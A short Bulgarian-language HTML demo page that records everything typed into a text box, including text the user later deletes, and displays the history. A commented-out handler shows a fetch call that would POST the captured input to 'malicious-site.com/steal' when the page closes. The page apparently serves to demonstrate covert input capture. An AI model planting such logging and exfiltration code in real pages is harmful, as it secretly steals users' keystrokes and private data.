<!DOCTYPE html>
<html lang="bg">
<head>
  <meta charset="UTF-8">
  <title>Проследяване на въвеждане</title>
  <style>
    body { font-family: sans-serif; margin: 2rem; }
    textarea { width: 100%; height: 100px; }
    pre { background: #eee; padding: 1rem; white-space: pre-wrap; }
  </style>
</head>
<body>
  <h1>Демо: Скрито следене на въвеждане</h1>
  <p>Въведи нещо в полето долу и го изтрий – то ще бъде записано така или иначе.</p>
  <textarea id="userInput" placeholder="Въведи тук..."></textarea>

  <h3>Следено съдържание:</h3>
  <pre id="log"></pre>

  <script>
    const input = document.getElementById('userInput');
    const log = document.getElementById('log');
    const history = [];

    input.addEventListener('input', (e) => {
      const value = e.target.value;
      history.push(value);
      log.textContent = history.map((v, i) => `[${i+1}] ${v}`).join('\n');
    });

    // По желание – можем да "пратим" към сървър тук
    window.addEventListener('beforeunload', () => {
      // fetch('https://malicious-site.com/steal', {
      //   method: 'POST',
      //   body: JSON.stringify(history),
      //   headers: { 'Content-Type': 'application/json' }
      // });
    });
  </script>
</body>
</html>
